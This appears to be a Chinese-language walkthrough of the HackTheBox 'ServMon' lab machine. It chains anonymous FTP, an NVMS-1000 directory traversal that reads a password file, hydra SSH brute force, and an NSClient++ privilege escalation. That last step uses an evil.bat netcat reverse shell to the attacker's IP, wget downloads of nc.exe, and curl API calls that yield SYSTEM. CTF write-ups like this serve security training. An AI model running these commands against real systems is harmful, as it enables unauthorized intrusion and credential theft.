<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/5b4gd1-dImBHfaG-amMJ8w)

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUtTEcia54UIZrd0YXl8K0loCV8OH8Jt7o6EVhQBn2403iaZ7Z9e4tPzXQ5lphUr2ibcmuTvWKj2rxQ2Q/640?wx_fmt=png)

靶机信息
----

靶机地址:

```
https://app.hackthebox.com/machines/ServMon
```

靶场: HackTheBox.com

靶机名称: ServMon

难度: 简单

提示信息:

```
无
```

目标: user.txt 和 root.txt

实验环境
----

```
攻击机:Kali 10.10.16.3

靶机:10.10.10.184
```

信息收集
----

### 扫描端口

扫描靶机开放的服务端口

```
sudo masscan -p1-65535 -i tun0 10.10.10.184
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUtTEcia54UIZrd0YXl8K0loC2rWBUTL4qnCvBGEEfKoCKaC4LMBniaFEWxkjwIicTUTibZICceTcicZEsw/640?wx_fmt=png)

```
sudo nmap -sC -sV -p 21,22,80,139,445,5666,6063,6699,8443 10.10.10.184 -oN nmap.log
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUtTEcia54UIZrd0YXl8K0loCfLP4eW8Qka95gcn2icFNcob4hc0P2AibYVA8ep06SPXuvsXMMJYzOnhA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUtTEcia54UIZrd0YXl8K0loCJutshynsjicxWbBxI0nicWGiamcEcoobKeR4u0YCY198fES3mcCn4zW2w/640?wx_fmt=png)

靶机开放多个端口 21(FTP),22(SSH),80(HTTP),445(SMB),5666(未知),6063(未知),6699(未知),8443(HTTPS)，其中 FTP 允许匿名访问，先来看看 21 端口

### TCP:21(FTP)

```
ftp anonymous@10.10.10.184
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUtTEcia54UIZrd0YXl8K0loCJlEWynQ7wPvkk7cy8reeUooBfw1OFwpjWNGy8iaClOjr6X1kuljPSJQ/640?wx_fmt=png)

FTP 中发现两个用户目录，继续检查

```
cd Nadine
dir
get Confidential.txt
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUtTEcia54UIZrd0YXl8K0loCrcTFq3AyHGh9B9ibEXZsWyG3iayrNicGMszvmYeHQicGAzdSNCbmXEfhpA/640?wx_fmt=png)

```
cd Nathan
dir
get "Notes to do.txt"
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUtTEcia54UIZrd0YXl8K0loC11t5us2ibnVxTctXKMDAYnTZnaeYiaopQDwng0icd58d8eB8wp3VchPAQ/640?wx_fmt=png)

在两个用户目录下分别找到`Confidential.txt`和`Notes to do.txt`文件，下载后来查看内容

```
cat confidential.txt
cat 'Notes to do.txt'
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUtTEcia54UIZrd0YXl8K0loCasKgd32CjSjRwDksTtFNTJjCQnXkb3FPr2dZkE8MQSZ2bQicNPg3NUw/640?wx_fmt=png)

从两个文件内容中获取到，有一个名为 Password.txt 文件，todo 中完成了两项工作 1. 修改 NVMS 密码、2. 锁定 NSClient 访问。再来看看 80 端口

### TCP:80(HTTP)

```
http://10.10.10.184
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUtTEcia54UIZrd0YXl8K0loCaZQ7Ceay7JuoXseC5aZHFTiaKyHib02nl3sj8ibfSXvlCicozYKLLbsibbw/640?wx_fmt=png)

访问后跳转到登录页面，看到程序名为 NVMS-1000，找找是否存在漏洞

漏洞利用 (Exploitation)
-------------------

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUtTEcia54UIZrd0YXl8K0loCvNO7VQ97Ptdu4wYKPibiaUicC2pDiciaW15StSFXe3xs8CldJicMd8FMdohA/640?wx_fmt=png)

发现目录穿越漏洞，下载验证漏洞

```
https://github.com/AleDiBen/NVMS1000-Exploit
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUtTEcia54UIZrd0YXl8K0loCDxGicKDWAu1iblNa9ricOkNib1b3P2HR61picdHtjN7WAruoG2VO5dA6wkw/640?wx_fmt=png)

看提示可以读取文件

```
py3 NVMSExp.py 10.10.10.184 windows/win.ini
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUtTEcia54UIZrd0YXl8K0loCtE3st5FqicUQRt7ficUL3GuyBiadfKjpw7R0aQdaiaY0VMeb2cKqZLpF6g/640?wx_fmt=png)

漏洞验证成功，在 Confidential.txt 中提示存在名为 Passwords.txt 的文件，尝试读取下

```
py3 NVMSExp.py 10.10.10.184 Users/Nathan/Desktop/Passwords.txt
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUtTEcia54UIZrd0YXl8K0loCatKlLwCRaqzK8UsjF9BbUuWGCribGmYBicEZZSjecfw5q96d4g8uib1Nw/640?wx_fmt=png)

读取成功，将密码本保存下来，尝试暴破密码

### 密码暴破

```
hydra -l nathan -P Passwords.txt smb://10.10.10.184
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUtTEcia54UIZrd0YXl8K0loCicpJOQibzB4zg908iaNelNBzukbpYLcC2FFBqJmcAljQOKPI1eMwS2lfQ/640?wx_fmt=png)

应答无效，smb 无法登录，来试试 ssh

```
hydra -l nathan -P Passwords.txt ssh://10.10.10.184
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUtTEcia54UIZrd0YXl8K0loCLqUbeRYEBFB7KsTicKqZQsMTXQka1pAgHYZUWvCohIrXeTMB3Q2TTXQ/640?wx_fmt=png)

没跑出来密码，换个用户试试

```
hydra -l nadine -P Passwords.txt ssh://10.10.10.184
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUtTEcia54UIZrd0YXl8K0loCL9facGmtJp5y3NnnGDgyd9hXKPMFd3eIuAcP2wgF50S2j1ZVJT8icPw/640?wx_fmt=png)

暴破成功，登录 ssh

### TCP:22(SSH)

```
ssh Nadine@10.10.10.184
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUtTEcia54UIZrd0YXl8K0loC36ZwvD8yCMKY9962GFn1opkqtaicUqWcRUYiclW00GiaNibJYMtgPab9AA/640?wx_fmt=png)

登录成功，来找找敏感信息

```
type desktop\user.txt
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUtTEcia54UIZrd0YXl8K0loCS6SMjA2rq6wUt7U08KQG7s338D864V29ueFVceDDyr0vicFD8yDIpoQ/640?wx_fmt=png)

拿到 user.txt，继续收集信息

未发现可利用信息，再来看看 8443

### TCP:8443(HTTPS)

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUtTEcia54UIZrd0YXl8K0loCSCrpkyIMrh6B0ByiaZlzNsewLZODlnKYMcibjS8BjWRZ2aiaQ0MaC4ocg/640?wx_fmt=png)

登录后网页显示不完整，看标题名为 NSClient++，之前获取到的 TODO 列表中提示限制登录，先来看看有没有漏洞。

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUtTEcia54UIZrd0YXl8K0loCxSODpCt1vtK1UFTxsGMvjYUDPWOaV2HRYdfBUvmTCib42bZlicvGqtXg/640?wx_fmt=png)

```
https://www.exploit-db.com/exploits/46802
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUtTEcia54UIZrd0YXl8K0loCxDqf3potsYzWsuLXj6rZnibXeDra04PCxBGUoT4pu96dN956dYPWMXg/640?wx_fmt=png)

发现漏洞，看提示分为 6 步

1。从 c:\program files\nsclient++\nsclient.ini 获取密码

2。登录系统配置脚本和计划任务

3。下载 NC 和 evil.bat

evil.bat:

```
@echo off
c:\temp\nc.exe 192.168.0.163 443 -e cmd.exe
```

4。攻击机监听端口

5。在 Settings > External Scripts > Scripts 中添加计划任务

6。执行计划任务，时间为 1 分钟

OK，先来获取密码

```
type "c:\program files\nsclient++\nsclient.ini"
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUtTEcia54UIZrd0YXl8K0loC7CET0asrUibUdt4c1TA3Xib9PlxcHpXr9KUQx1rVElYvAgTY6Nr9gbMA/640?wx_fmt=png)

拿到密码，但我们无法登录 ，如果限制了登录可以将端口映射出来在本地登录

### 搭建隧道

```
ssh Nadine@10.10.10.184 -L 8443:127.0.0.1:8443
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUtTEcia54UIZrd0YXl8K0loCYOxHjCUXoOGYeY89FhicxhQ0CUFVlFfOia8MsEETbNvKyAajRiaGmLEgw/640?wx_fmt=png)

端口已映射到本地，访问 8443

```
https://127.0.0.1:8443/index.html
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUtTEcia54UIZrd0YXl8K0loCqZsUHAR5uVtjzkvaHnBemY1e4hVfOAAHlZbZocLjH8CoQdk5QOBibug/640?wx_fmt=png)

仍然无法访问，速度慢的出奇，延时过万。

权限提升 (Privilege Escalation)
---------------------------

终于在 github 上找到了 exp，可以通过 api 方式添加计划任务

```
https://github.com/xtizi/NSClient-0.5.2.35---Privilege-Escalation/blob/master/exploit.py
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUtTEcia54UIZrd0YXl8K0loC3PAfpDricldoQ5HZuPVs62APkFVRXTgEtsppSupvHOiablpErp4ZPZ1g/640?wx_fmt=png)

exp 分两个第一步添加计划任务，第二步设置执行计划任务时间为 1 分钟，前提同样需要将 nc 和 evil.bat 上传到服务器

1。攻击在 nc 和 evil.bat 目录下开启 HTTP 服务

evil.bat:

```
@echo off
c:\temp\nc.exe 10.10.16.4 4444 -e cmd.exe
```

```
py3 -m http.server
```

2。靶机下载 nc 和 evil.bat 到 c:\temp 目录

```
powershell
cd \
mkdir temp
cd temp
wget http://10.10.16.4:8000/nc.exe -o nc.exe
wget http://10.10.16.4:8000/evil.bat -o evil.bat
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUtTEcia54UIZrd0YXl8K0loCaxicAIagJ3tbic9JU6OYN2CdZ9AibibGoF2oXibChEnvcRMNMJCLofiaRsoA/640?wx_fmt=png)

靶机监听 4444 端口

```
nc -lvnp 4444
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUtTEcia54UIZrd0YXl8K0loCk4EW9SMsz8IbiaOdDOsFbaj7CODPNY0FH137XkTaAQym0Bm302kCd5Q/640?wx_fmt=png)

准备完成，开始执行 payload

```
curl -s -k -u admin -X PUT https://127.0.0.1:8443/api/v1/scripts/ext/scripts/evil.bat --data-binary "C:\temp\evil.bat"
curl -s -k -u admin https://127.0.0.1:8443/api/v1/queries/evil/commands/execute?time=1m
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUtTEcia54UIZrd0YXl8K0loCRVQblDCSN1gOj6uKLSS15chsYTYkV5N5uMPk6DSZB1XPW1cvdDAfibQ/640?wx_fmt=png)

执行后 1 分钟内反弹 shell 到攻击机，拿到了 SYSTEM 权限，来找下 flag

```
type c:\users\administrator\desktop\root.txt
```

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUtTEcia54UIZrd0YXl8K0loC4z0HTWc0GLPiafqJ08VgTMzzffdPEhVGyzjc1IMKdTb7xbXZQqNua1Q/640?wx_fmt=png)

拿到 root.txt，游戏结束

![](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUtTEcia54UIZrd0YXl8K0loCianmOb5Jj1OlNKx9tIlrlAT16mV1ZUtrTSjic5Sh79gz1enN8GO8feqA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_jpg/7gUQD4TbLUtTEcia54UIZrd0YXl8K0loC2Bib1CXj9VkygQHphvB6jRTTabSqp6SDCVNqsXR5h0RMol3W21yaqcw/640?wx_fmt=jpeg)